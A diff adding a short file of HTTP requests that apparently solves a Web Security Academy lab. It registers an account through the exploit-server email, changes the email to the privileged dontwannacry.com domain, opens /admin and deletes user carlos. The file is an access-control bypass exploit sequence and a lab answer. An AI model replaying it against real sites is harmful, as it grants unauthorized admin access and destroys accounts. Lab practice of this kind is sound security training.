@@ -1,0 +1,21 @@
+POST /register HTTP/1.1
+
+csrf=9Fu6RxJY2dD0YjoRqq77bTx2qp7yVAr8&username=wiener3&email=wiener3%40exploit-aca91fc41ffa3cc4c06f0d8301770037.web-security-academy.net&password=peter
+
+GET /email HTTP/1.1
+
+GET /register?temp-registration-token=Wr6TxXomAReF0Ynf1rBt3AQJYphE3glU HTTP/1.1
+
+POST /login HTTP/1.1
+
+csrf=9Fu6RxJY2dD0YjoRqq77bTx2qp7yVAr8&username=wiener3&password=peter
+
+POST /my-account/change-email HTTP/1.1
+
+email=wiener3%40dontwannacry.com&csrf=qUBDQEtwxmeyJX1W2rFFIn34wpbcmx7u
+
+GET /my-account HTTP/1.1
+
+GET /admin HTTP/1.1
+
+GET /admin/delete?username=carlos HTTP/1.1
